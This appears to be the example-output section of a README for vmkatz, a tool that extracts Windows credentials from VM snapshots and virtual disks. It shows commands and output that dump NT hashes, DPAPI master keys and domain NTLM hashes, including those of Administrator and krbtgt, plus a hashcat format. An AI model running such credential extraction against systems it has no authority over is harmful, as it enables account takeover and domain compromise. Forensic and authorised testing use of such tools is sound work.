# Example Output

## LSASS extraction (default text)
```
$ vmkatz snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) Kerberos(paged) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(paged)

[+] 8 logon session(s), 3 with credentials:

  LUID: 0x3e7 (SYSTEM)
  Username: YOURPC$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 94e9f320-d4a0-4737-b34e-ab106f485c0e
    MasterKey     : d0f110675ca73f39d1370bdfd...
    SHA1 MasterKey: ea72698de207dab9e01fd9ab63f322ae82b4a4bb

  LUID: 0x240be
  Session: 2 | LogonType: Unknown
  Username: user
  Domain: YOURPC
  LogonServer: YOURPC
  SID: S-1-5-21-4247878743-2693906039-1959858616-1000
  [MSV1_0]
    NT Hash : bbf7d1528afa8b0fdd40a5b2531bbb6d
    SHA1    : 6ed12f1e60b17cfff120d753029314748b58aa05
    DPAPI   : 6ed12f1e60b17cfff120d753029314748b58aa05
```

## Hashcat mode
```
$ vmkatz --format hashcat snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) ...
bbf7d1528afa8b0fdd40a5b2531bbb6d
```

## NTDS.dit extraction
```
$ vmkatz --ntds dc-disk.qcow2

[+] NTDS Artifacts:
  Partition offset : 0x100000
  ntds.dit size    : 20971520 bytes
  SYSTEM size      : 14155776 bytes
  Bootkey          : 9ae365ba5244457bfc2a26187a28346a
  Hashes extracted : 18

[+] AD NTLM Hashes:
  RID: 500    Administrator            current    NT:c66d72021a2d4744409969a581a1705e
  RID: 502    krbtgt                   current    NT:9c238cafb7b4447e5f701c71dbdcf636
  RID: 1000   vagrant                  current    NT:e02bc503339d51f71d913c245d35b50b
  ...
```

## Pagefile resolution
```
$ vmkatz --disk disk.vmdk snapshot.vmsn
[+] Pagefile: 320.0 MB
[*] Providers: MSV(ok) WDigest(ok) ...
[+] File-backed: 12540 DLL pages resolved from disk
[+] Pagefile: 2274 pages resolved from disk
```

Memory snapshots only capture physical RAM. Credentials that were paged to disk at snapshot time appear as `(paged out)`. The `--disk` flag reads pagefile.sys from the VM's virtual disk to resolve these.

In **directory mode**, this happens automatically: VMkatz discovers both the snapshot and the disk image, and resolves paged memory without manual flags.
